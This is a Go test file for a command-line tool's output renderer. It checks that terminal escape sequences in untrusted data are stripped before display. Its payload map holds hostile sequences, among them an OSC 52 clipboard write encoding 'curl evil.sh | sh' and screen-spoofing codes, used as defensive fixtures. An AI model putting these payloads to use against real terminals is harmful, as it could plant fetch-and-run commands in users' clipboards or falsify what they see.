package cli

import (
	"bytes"
	"strings"
	"testing"

	"github.com/this-is-tobi/rta/pkg/view"
)

// payloads are the sequences worth naming individually, because each one
// buys the attacker something different.
var payloads = map[string]string{
	// Writes the base64 into the reader's system clipboard. Enabled by
	// default in iTerm2, kitty, foot, WezTerm and Windows Terminal, and in
	// tmux with set-clipboard on. Decodes here to: curl evil.sh | sh
	"osc52 clipboard write": "ok\x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\x07",
	// Rewrites the window title. Some terminals will report it back.
	"osc0 window title": "ok\x1b]0;PWNED\x07",
	// Erases what was printed above, including the command that produced it.
	"csi erase display": "ok\x1b[2J",
	// Moves the cursor, so subsequent output lands over earlier output.
	"csi cursor move": "ok\x1b[10;10H",
	// No escape at all: a bare CR returns to column 0, so the line on screen
	// reads EVIL while the data says safe. The one that survives a naive
	// "strip ESC sequences" filter.
	"bare cr overwrite": "safe\rEVIL",
	// Audible, and repeatable enough to be a denial of attention.
	"bel": "ok\a",
	// CSI in its 8-bit form. ansi.Strip does not treat it as an introducer,
	// so it is the case that needs the C1 range and not just the parser.
	"c1 csi": "ok2J",
}

// escaped reports whether anything in out could still be acted on by a
// terminal.
func escaped(out string) bool {
	return strings.ContainsAny(out, "\x1b\a\r") || strings.ContainsRune(out, 0x9b)
}

// withPayload builds one instance of each view type carrying p in every
// string a renderer prints.
func withPayload(p string) map[string]view.View {
	return map[string]view.View{
		"text":     view.Text{Body: p},
		"keyvalue": view.KeyValue{Pairs: []view.Pair{{Key: p, Value: p}}},
		"table": view.Table{
			Columns: []view.Column{{Name: p}},
			Rows:    [][]string{{p}},
		},
		"tree": view.Tree{Roots: []view.Node{
			{Label: p, Detail: p, Children: []view.Node{{Label: p, Detail: p}}},
		}},
		"chart": view.Chart{
			Kind:   view.ChartBar,
			Series: []view.Series{{Name: p, Points: []float64{1}}},
			Unit:   p,
		},
		"sections": view.Sections{
			Items:    []view.Section{{Title: p, View: view.Text{Body: p}}},
			Warnings: []view.Error{{Code: "x.y.z", Message: p, Hint: p}},
		},
		"error": &view.Error{Code: "x.y.z", Message: p, Hint: p},
	}
}

// A view is data from somewhere else — an HTTP body, a DNS record, a
// filename, a database row — so "plugins do not emit ANSI" was
// never a property the producer could be trusted for. The renderer is where
// it becomes true.
func TestNoEscapeSequenceReachesTheTerminal(t *testing.T) {
	for name, p := range payloads {
		for kind, v := range withPayload(p) {
			for _, f := range []Format{Pretty, Markdown} {
				var buf bytes.Buffer
				if err := Render(&buf, v, Options{Format: f, NoColor: true, Width: 80}); err != nil {
					t.Fatalf("%s/%s/%s: %v", name, kind, f, err)
				}
				if escaped(buf.String()) {
					t.Errorf("%s survived %s as %s: %q", name, kind, f, buf.String())
				}
			}
		}
	}
}

// RenderError is a separate entry point, and AsError puts a foreign error's
// own text into Message — so a hostile server's error string is as much a
// display channel as its response body was.
func TestNoEscapeSequenceReachesTheTerminalThroughAnError(t *testing.T) {
	for name, p := range payloads {
		for _, f := range []Format{Pretty, Markdown} {
			var buf bytes.Buffer
			e := &view.Error{Code: "x.y.z", Message: p, Hint: p}
			if err := RenderError(&buf, e, Options{Format: f, NoColor: true, Width: 80}); err != nil {
				t.Fatalf("%s/%s: %v", name, f, err)
			}
			if escaped(buf.String()) {
				t.Errorf("%s survived an error as %s: %q", name, f, buf.String())
			}
			if e.Message != p {
				t.Errorf("RenderError mutated the caller's error: %q", e.Message)
			}
		}
	}
}

// json is the byte-exact channel and stays that way: it escapes the control
// character rather than dropping it, so it is lossless and safe at once, and
// making it lossy for the sake of a display problem would break the one
// format the contract promises works in a pipe.
func TestJSONStaysByteExact(t *testing.T) {
	const p = "ok\x1b]52;c;AAAA\x07"
	v := view.KeyValue{Pairs: []view.Pair{{Key: "k", Value: p}}}
	var buf bytes.Buffer
	if err := Render(&buf, v, Options{Format: JSON}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(strings.ToLower(buf.String()), "001b") {
		t.Errorf("json did not carry the value through: %q", buf.String())
	}
	if escaped(buf.String()) {
		t.Errorf("json emitted a raw escape: %q", buf.String())
	}
}

// yaml and csv are cleaned like the presentation formats, because neither is
// safe by construction: goccy/go-yaml puts a control character straight into
// a plain scalar, and encoding/csv quotes for comma, quote and newline only.
// Reading `-o yaml` in a terminal is the ordinary way to use it, so a raw
// OSC 52 there is the same attack as in the pretty renderer with an extra
// flag on the end.
func TestYAMLAndCSVAreCleaned(t *testing.T) {
	for name, p := range payloads {
		var buf bytes.Buffer
		kv := view.KeyValue{Pairs: []view.Pair{{Key: "k", Value: p}}}
		if err := Render(&buf, kv, Options{Format: YAML}); err != nil {
			t.Fatal(err)
		}
		if escaped(buf.String()) {
			t.Errorf("%s survived yaml: %q", name, buf.String())
		}
		buf.Reset()
		tbl := view.Table{Columns: []view.Column{{Name: "A"}}, Rows: [][]string{{p}}}
		if err := Render(&buf, tbl, Options{Format: CSV}); err != nil {
			t.Fatal(err)
		}
		if escaped(buf.String()) {
			t.Errorf("%s survived csv: %q", name, buf.String())
		}
	}
}

// Content a value may legitimately carry must survive, or the control turns
// into data loss: a certificate PEM, a JSON body and a stack trace are all
// multi-line, and a tab is how half the world's output is aligned.
func TestNewlineAndTabSurvive(t *testing.T) {
	v := view.Text{Body: "one\ntwo\tthree"}
	var buf bytes.Buffer
	if err := Render(&buf, v, Options{Format: Pretty, NoColor: true, Width: 80}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(buf.String(), "one\ntwo") {
		t.Errorf("the newline was dropped: %q", buf.String())
	}
	if !strings.Contains(buf.String(), "\t") {
		t.Errorf("the tab was dropped: %q", buf.String())
	}
}

// The TUI re-renders every pane on every keystroke, so the overwhelmingly
// common case — data with nothing wrong with it — must not allocate a copy
// of the view to discover that. Identity is the observable form of that.
func TestCleanViewsAreNotCopied(t *testing.T) {
	tbl := view.Table{
		Columns: []view.Column{{Name: "A"}},
		Rows:    [][]string{{"one"}, {"two"}},
	}
	got, ok := sanitize(tbl).(view.Table)
	if !ok {
		t.Fatal("sanitize changed the type")
	}
	if &got.Rows[0][0] != &tbl.Rows[0][0] {
		t.Error("a clean table was copied")
	}
	kv := view.KeyValue{Pairs: []view.Pair{{Key: "k", Value: "v"}}}
	if &sanitize(kv).(view.KeyValue).Pairs[0] != &kv.Pairs[0] {
		t.Error("a clean keyvalue was copied")
	}
}

// A dirty view must not be cleaned in place: the TUI holds one view and
// renders it repeatedly, and the same value is handed to the json path by
// `rta ... -o json` in another process — but more simply, a function that
// edits its argument is a function whose second caller gets a surprise.
func TestSanitizeDoesNotMutateItsArgument(t *testing.T) {
	const p = "ok\x1b[2J"
	tbl := view.Table{Columns: []view.Column{{Name: p}}, Rows: [][]string{{p}}}
	_ = sanitize(tbl)
	if tbl.Rows[0][0] != p || tbl.Columns[0].Name != p {
		t.Errorf("the caller's table was rewritten: %q / %q", tbl.Rows[0][0], tbl.Columns[0].Name)
	}
}
